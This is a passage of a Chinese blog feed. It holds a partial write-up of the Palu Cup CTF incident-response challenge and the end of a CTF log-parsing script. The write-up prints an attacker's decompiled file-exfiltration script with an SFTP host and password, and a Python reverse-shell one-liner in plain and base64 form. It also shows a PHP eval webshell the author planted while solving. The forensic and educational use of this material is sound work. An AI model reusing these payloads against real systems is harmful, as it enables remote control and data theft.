decoded_json.append(decoded_obj)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> decoded_json</span><br><span class="line">    <span class="keyword">except</span> json.JSONDecodeError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> [&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Invalid JSON format&quot;</span>&#125;]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 提示用户输入 JSON 数组字符串</span></span><br><span class="line">    input_json = <span class="built_in">input</span>(<span class="string">&quot;请输入JSON数组字符串：&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 调用函数进行解码并打印结果</span></span><br><span class="line">    decoded_json = decode_base64_json(input_json)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;解码后的JSON内容：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(json.dumps(decoded_json, indent=<span class="number">4</span>))</span><br></pre></td></tr></table></figure><h5 id="sql-log"><a href="#sql-log" class="headerlink" title="sql log"></a>sql log</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;D:\\vscodework\\ctf\\2023新生赛\\week2\\access.log&quot;</span>,encoding = <span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">f = f.readlines()</span><br><span class="line">lists = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">    s = re.findall(<span class="string">&quot;1\)\)=(.*),sl&quot;</span>,i)</span><br><span class="line">    num = re.findall(<span class="string">&quot;0user\),(.*?),1\)&quot;</span>,i)</span><br><span class="line">    <span class="comment"># lists[num[0]] = s[0]</span></span><br><span class="line">    <span class="comment"># print(lists)</span></span><br><span class="line">    lists[<span class="built_in">int</span>(num[<span class="number">0</span>])]= <span class="built_in">str</span>(s[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">list</span>(lists.values()):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(e)),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>第一届帕鲁杯-CTF应急响应挑战赛部分wp</title>
      <link href="/2024/04/19/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
      <url>/2024/04/19/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240423085916686.png" alt="image-20240423085916686"></p><p>赛题：<a href="https://pan.baidu.com/s/1NtC9RkO2MgG__oTffWYiRw?pwd=kc2y">https://pan.baidu.com/s/1NtC9RkO2MgG__oTffWYiRw?pwd=kc2y</a></p><p>赛题文件：<a href="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A8%A1%E5%9D%97%E8%AF%B4%E6%98%8E%E6%89%8B%E5%86%8C.pdf">应急响应模块说明手册.pdf </a>应急响应模块说明手册.pdf </p><h2 id="应急响应-1"><a href="#应急响应-1" class="headerlink" title="应急响应-1"></a>应急响应-1</h2><p><strong>题目要求：</strong><br>找到JumpServer堡垒机中flag标签的值。</p><hr><p><strong>提交格式：</strong><br>[堡垒机中flag标签的值]</p><p>登上jumpserver就可以了<br>点控制台的更多选项里面有个标签值即可</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240419135123741.png" alt="image-20240419135123741"></p><h2 id="应急响应-2"><a href="#应急响应-2" class="headerlink" title="应急响应-2"></a>应急响应-2</h2><p><strong>题目要求：</strong><br>提交攻击者第一次登录时间。</p><hr><p><strong>提交格式：</strong><br>[2024/00/00/00:00:00]<br>找到日志审计，查看登录日志，选一下时间，近一年的，</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422091737237.png" alt="image-20240422091737237"></p><p>ip为192.168.20.123的时间</p><blockquote><p>flag : [2024/04/11/14:21:18]</p></blockquote><h2 id="应急响应-3"><a href="#应急响应-3" class="headerlink" title="应急响应-3"></a>应急响应-3</h2><p><strong>题目要求：</strong><br>提交攻击者源IP。</p><hr><p><strong>提交格式：</strong><br>[0.0.0.0]</p><p>因为后面test01的用户执行了jump server的rce，可能是nat转过来的</p><blockquote><p>flag:192.168.1.4</p></blockquote><h2 id="应急响应-4"><a href="#应急响应-4" class="headerlink" title="应急响应-4"></a>应急响应-4</h2><p><strong>题目要求：</strong><br>提交攻者使用的cve编号。</p><hr><p><strong>提交格式：</strong><br>[CVE-0000-0000]</p><p>在审计台的日志审计中，有一个作业日志</p><p>test执行了两个rce</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422092914024.png" alt="image-20240422092914024"></p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422093117730.png" alt="image-20240422093117730"></p><p>有两个，都试一下</p><blockquote><p>flag: CVE-2024-29201</p></blockquote><h2 id="应急响应-5"><a href="#应急响应-5" class="headerlink" title="应急响应-5"></a>应急响应-5</h2><p><strong>题目要求：</strong><br>提交攻击者留在Web服务器上的恶意程序的32位小写md5值。</p><hr><p><strong>提交格式：</strong><br>[xxxxxx]</p><p>由题意可知，web服务器在 192.168.20.121上面，但是 192.168.20.121的服务器账号密码是没有给的我们可以在jump上面看一下历史命令，在资产列表里面登录，看历史命令，搜一下passwd shadow等等</p><p>第一条可以看到palu.com的hash等等<img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422095000280.png" alt="image-20240422095000280"></p><p>但是这个palu.com的hash不全，裂开<br>我们这里其实可以直接用diskgeninus将server的盘导进来，直接看文件<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422113122397.png" alt="image-20240422113122397"></p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422113314688.png" alt="image-20240422113314688"></p><p>直接跑hash,palu.com/123123<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422134343810.png" alt="image-20240422134343810"></p><p>webserver上有计算过home文件</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422134415059.png" alt="image-20240422134415059"></p><p>在root下面也可以找到home文件，计算一下即可</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422135155298.png" alt="image-20240422135155298"></p><p>这里知道账号密码直接ssh连上来，在222端口</p><blockquote><p>flag:84413332e4e7138adc5d6f1f688ddd69</p></blockquote><h2 id="应急响应-6"><a href="#应急响应-6" class="headerlink" title="应急响应-6"></a>应急响应-6</h2><p><strong>题目要求：</strong><br>分析恶意程序连接地址和密码。</p><hr><p><strong>提交格式：</strong><br>[md5(地址)-md5(密码)] md5值为全小写32位长度</p><p>抄人家的wp发现是一个python的linux文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Source Generated with Decompyle++</span></span><br><span class="line"><span class="comment"># File: palucomeyi1.pyc (Python 3.10)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">from</span> getpass <span class="keyword">import</span> getpass</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_in_files</span>(<span class="params">directory, search_text</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># WARNING: Decompyle incomplete</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssh</span>(<span class="params">local_file_path, remote_file_path</span>):</span></span><br><span class="line">    hostname = <span class="string">&#x27;82.157.238.111&#x27;</span></span><br><span class="line">    port = <span class="number">22</span></span><br><span class="line">    username = <span class="string">&#x27;root&#x27;</span></span><br><span class="line">    password = <span class="string">&#x27;1qaz@WSX3edc&#x27;</span></span><br><span class="line">    client = paramiko.SSHClient()</span><br><span class="line">    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">    client.connect(hostname, port, username, password)</span><br><span class="line">    sftp = client.open_sftp()</span><br><span class="line">    sftp.put(local_file_path, remote_file_path)</span><br><span class="line">    sftp.close()</span><br><span class="line">    client.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;&#x27;&#x27;File <span class="subst">&#123;local_file_path&#125;</span> uploaded to <span class="subst">&#123;remote_file_path&#125;</span> on <span class="subst">&#123;hostname&#125;</span>&#x27;&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">search_directory = <span class="string">&#x27;/&#x27;</span></span><br><span class="line">search_for_text = <span class="string">&#x27;passwod&#x27;</span></span><br><span class="line">(a, b) = search_in_files(search_directory, search_for_text)</span><br><span class="line">ssh(a, b)</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>82.157.238.111 1qaz@WSX3edc</p></blockquote><h2 id="应急响应-7"><a href="#应急响应-7" class="headerlink" title="应急响应-7"></a>应急响应-7</h2><p><strong>题目要求：</strong><br>提交存在反序列化漏洞的端口。</p><hr><p><strong>提交格式：</strong><br>[md5(端口)]</p><p>登录雷池的waf可以看到fastjson的端口</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422100949500.png" alt="image-20240422100949500"></p><p>上游地址是8080，映射到雷池的7878，所以本身是8080端口</p><blockquote><p>flag:8080的md5</p></blockquote><h2 id="应急响应-8"><a href="#应急响应-8" class="headerlink" title="应急响应-8"></a>应急响应-8</h2><p><strong>题目要求：</strong><br>提交攻击者使用的后门路由地址。</p><hr><p><strong>提交格式：</strong><br>[md5(/api/xxx)]<br>我们在jump上翻一翻，可以看到有一个log.txt，也是不全的，当时做题的时候，没有webserver的密码，那么就看不了<br>翻那个waf的时候，可以看到有命令执行的后门，然后索性，把雷池waf所有的安全都关掉，直接写个马进去，连上，直接翻log的txt就可以了。当然，这样肯定不是预期解。<br><code>?123=system(&quot;echo &#39;&lt;?php eval(\$_POST[1]); ?&gt;&#39; &gt; a.php&quot;);</code><br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422101901120.png" alt="image-20240422101901120"></p><p>可以看到文件名为flask，那么可能就是py文件了<br>全盘搜，没有搜到，应该是删了<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422102029282.png" alt="image-20240422102029282"></p><p>回到jump里面搜命令，可以看到有接口system</p><blockquote><p>flag:/api/system的md5</p></blockquote><h2 id="应急响应-9"><a href="#应急响应-9" class="headerlink" title="应急响应-9"></a>应急响应-9</h2><p><strong>题目要求：</strong><br>提交dnslog反弹域名。</p><hr><p><strong>提交格式：</strong><br>[md5(域名)]</p><p>log日志中有</p><blockquote><p>flag:0vqkht.dnslog.cn</p></blockquote><h2 id="应急响应-10"><a href="#应急响应-10" class="headerlink" title="应急响应-10"></a>应急响应-10</h2><p><strong>题目要求：</strong><br>提交第一次扫描器使用时间。</p><hr><p><strong>提交格式：</strong><br>[2024/00/00/00:00:00]</p><p>这里第一次扫描器的时间，感觉是<br> 2024/04/17 08:59:18</p><p> 2024/04/17 08:59:00<br>这两个，为什么呢</p><table><thead><tr><th>./fscan -h 192.168.20.0/24</th><th>接受</th><th>Administrator(admin)</th><th>192.168.1.4</th><th>WebServer(192.168.20.121)</th><th>home(home)</th><th>转到</th><th>2024/04/17 08:59:18</th></tr></thead><tbody><tr><td>`$ ./fscan  -h 192.168.20.0/24 ./fscan  -h 192.168.20.0/24   ___                              _      / _ \     ___  ___ _ __ __ _  ___</td><td></td><td>__  / /<em>/</em>___/ __</td><td>/ __</td><td>‘__/ _<code> |/ __| |/ / / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     \____/     |___/\___|_|  \__,_|\___|_|\_\                        fscan version: 1.8.3 start infoscan (icmp) Target 192.168.20.121  is alive (icmp) Target 192.168.20.2    is alive (icmp) Target 192.168.20.1    is alive (icmp) Target 192.168.20.11   is alive (icmp) Target 192.168.20.51   is alive (icmp) Target 192.168.20.52   is alive (icmp) Target 192.168.20.123  is alive [*] Icmp alive hosts len is: 7</code></td><td></td><td></td><td></td></tr></tbody></table><table><thead><tr><th>./fscan</th><th>接受</th><th>Administrator(admin)</th><th>192.168.1.4</th><th>WebServer(192.168.20.121)</th><th>home(home)</th><th>转到</th><th>2024/04/17 08:59:00</th></tr></thead><tbody><tr><td>`$ ./fscan ./fscan    ___                              _      / _ \     ___  ___ _ __ __ _  ___</td><td></td><td>__  / /<em>/</em>___/ __</td><td>/ __</td><td>‘__/ _<code> |/ __| |/ / / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     \____/     |___/\___|_|  \__,_|\___|_|\_\                    fscan version: 1.8.3 Host is none Usage of ./fscan:  -br int Brute threads (default 1)  -c string exec command (ssh|wmiexec)  -cookie string set poc cookie,-cookie rememberMe=login  -debug int every time to LogErr (default 60)  -dns using dnslo...c  -domain string smb domain  -full</code></td><td></td><td></td><td></td></tr></tbody></table><p>00那个是执行了fscan，19那个是扫了，不知道是哪一个，也有可能就不是fscan这个扫描器，是waf那边的，但是也不是，回头看看wp</p><p>果然，不是这个fscan的，是flask的日志</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422111931975.png" alt="image-20240422111931975"></p><p>19结尾就是，算一下</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422112133952.png" alt="image-20240422112133952"></p><blockquote><p>flag:[2024/04/15/02:26:59]</p></blockquote><h2 id="应急响应-11"><a href="#应急响应-11" class="headerlink" title="应急响应-11"></a>应急响应-11</h2><p><strong>题目要求：</strong><br>提交攻击者反弹shell使用的语言。</p><hr><p><strong>提交格式：</strong><br>[md5(c++&amp;java)]均为小写</p><p>往下滑，python的</p><p>1713120249.5091295—–import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((‘82.157.238.174’,7890));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(‘sh’)<br>1713120301.6446397—–pcntl_exec(‘/usr/bin/python’,[‘-c’,base64_decode(‘aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjgyLjE1Ny4yMzguMTc0Iiw3ODkwKSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigic2giKQ==’)]);</p><blockquote><p>flag:python</p></blockquote><h2 id="应急响应-12"><a href="#应急响应-12" class="headerlink" title="应急响应-12"></a>应急响应-12</h2><p><strong>题目要求：</strong><br>提交攻击者反弹shell的ip。</p><hr><p><strong>提交格式：</strong><br>[xxx.xxx.xxx.xxx]</p><p>解一下base64<br>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“82.157.238.174”,7890));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(“sh”)</p><blockquote><p>flag:82.157.238.174</p></blockquote><h2 id="应急响应-13"><a href="#应急响应-13" class="headerlink" title="应急响应-13"></a>应急响应-13</h2><p><strong>题目要求：</strong><br>提交攻击者留下的账号。</p><hr><p><strong>提交格式：</strong><br>[xxxxx]</p><p>攻击者的账号已经看到了，就是palu.com</p><blockquote><p>flag:palu.com</p></blockquote><h2 id="应急响应-14"><a href="#应急响应-14" class="headerlink" title="应急响应-14"></a>应急响应-14</h2><p><strong>题目要求：</strong><br>提交攻击者的后门账户密码。</p><hr><p><strong>提交格式：</strong><br>[md5(password)]</p><p>密码这里已经知道了，我用hashcat没有跑出来，john出来的</p><blockquote><p>123123</p></blockquote><h2 id="应急响应-15"><a href="#应急响应-15" class="headerlink" title="应急响应-15"></a>应急响应-15</h2><p><strong>题目要求：</strong><br>提交测试数据条数。</p><hr><p><strong>提交格式：</strong><br>[md5(xxx)]</p><p>这里测试数据竟然是注册的数据，裂开，交代的不清楚<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422140416744.png" alt="image-20240422140416744"></p><blockquote><p>flag:5</p></blockquote><h2 id="应急响应-16"><a href="#应急响应-16" class="headerlink" title="应急响应-16"></a>应急响应-16</h2><p><strong>题目要求：</strong><br>请提交攻击者留下的信息。</p><hr><p><strong>提交格式：</strong><br>flag{xxx}</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422103647429.png" alt="image-20240422103647429"></p><p>我们搜vim的话，有一个hacktext，<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422104039978.png" alt="image-20240422104039978"></p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422104107182.png" alt="image-20240422104107182"></p><blockquote><p>flag:flag{hi_palu_f10g}</p></blockquote><h2 id="应急响应-17"><a href="#应急响应-17" class="headerlink" title="应急响应-17"></a>应急响应-17</h2><p><strong>题目要求：</strong><br>请提交运维服务器上的恶意文件md5（小写32位md5值）。</p><hr><p><strong>提交格式：</strong><br>[xxxx]</p><p>jump上面的命令执行很少，<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422104508097.png" alt="image-20240422104508097"></p><p>有个helloworld<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422104629194.png" alt="image-20240422104629194"></p><blockquote><p>0fca0f847a45401c878d7a5303ddc1f8</p></blockquote><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422104730373.png" alt="image-20240422104730373"></p><h2 id="应急响应-18"><a href="#应急响应-18" class="headerlink" title="应急响应-18"></a>应急响应-18</h2><p><strong>题目要求：</strong><br>提交恶意文件的恶意函数。</p><hr><p><strong>提交格式：</strong><br>[md5(恶意函数)]</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422105456764.png" alt="image-20240422105456764"></p><p>sftp不好用，直接python开一个下载一下<br>托ida看一下，<img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422105643050.png" alt="image-20240422105643050"> begingame()</p><blockquote><p>flag:ddd0599cda1fc289a617db148d75383b</p></blockquote><h2 id="应急响应-19"><a href="#应急响应-19" class="headerlink" title="应急响应-19"></a>应急响应-19</h2><p><strong>题目要求：</strong><br>请提交攻击者恶意注册的恶意用户条数。</p><hr><p><strong>提交格式：</strong><br>[md5(x)]</p><p>根据文件找到数据库为mysql01，select * from pre_ucenter_members ;</p><p>查一下用户，是kongzi的这些<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422141428970.png" alt="image-20240422141428970"></p><blockquote><p>flag : 10</p></blockquote><h2 id="应急响应-20"><a href="#应急响应-20" class="headerlink" title="应急响应-20"></a>应急响应-20</h2><p><strong>题目要求：</strong><br>请提交对博客系统的第一次扫描时间。</p><hr><p><strong>提交格式：</strong><br>[2024/00/00/00:00:00]</p><p>博客的映射端口为80，</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422110228519.png" alt="image-20240422110228519"></p><p>筛选一下，我可以看到扫描的日志，<br><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422110536928.png" alt="image-20240422110536928"></p><p>w攻击事件中也可以看到，拦截了3.6k,就是扫描了，其他的也有一些扫描，但不是在blog的。</p><blockquote><p>2024-04-16 21:03:46</p></blockquote><h2 id="应急响应-21"><a href="#应急响应-21" class="headerlink" title="应急响应-21"></a>应急响应-21</h2><p><strong>题目要求：</strong><br>提交攻击者下载的文件。</p><hr><p><strong>提交格式：</strong><br>[xxxx.xxx]</p><p>在html目录下有一个upload.zip，日志中也可以看到</p><blockquote><p>flag:upload.zip</p></blockquote><h2 id="应急响应-22"><a href="#应急响应-22" class="headerlink" title="应急响应-22"></a>应急响应-22</h2><p><strong>题目要求：</strong><br>请提交攻击者第一次下载服务器文件的时间。</p><hr><p><strong>提交格式：</strong><br>[xx/Apr/2024:xx:xx:xx]</p><p>[2024/04/16/21:03:46]</p><p>我们将access5的日志下载下来看一下</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422142210985.png" alt="image-20240422142210985"></p><p>然后搜一下upload。zip<br>192.168.20.121:80 192.168.20.123 - - [16/Apr/2024:09:03:52 -0400] “GET /upload.zip HTTP/1.1” 206 8387 “-“ “Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0”</p><p><img src="/images/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AF-CTF%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%8C%91%E6%88%98%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20240422142301560.png" alt="image-20240422142301560"></p><blockquote><p>flag:[16/Apr/2024:09:03:52]</p></blockquote><h2 id="应急响应-23"><a href="#应急响应-23" class="headerlink" title="应急响应-23"></a>应急响应-23</h2><p><strong>题目要求：</strong><br>请提交攻击者留下的冰蝎马的文件名称。</p><hr><p><strong>提交格式：</strong><br>[xxxx]<br>筛选一下时间，可以看到一个</p><p><img 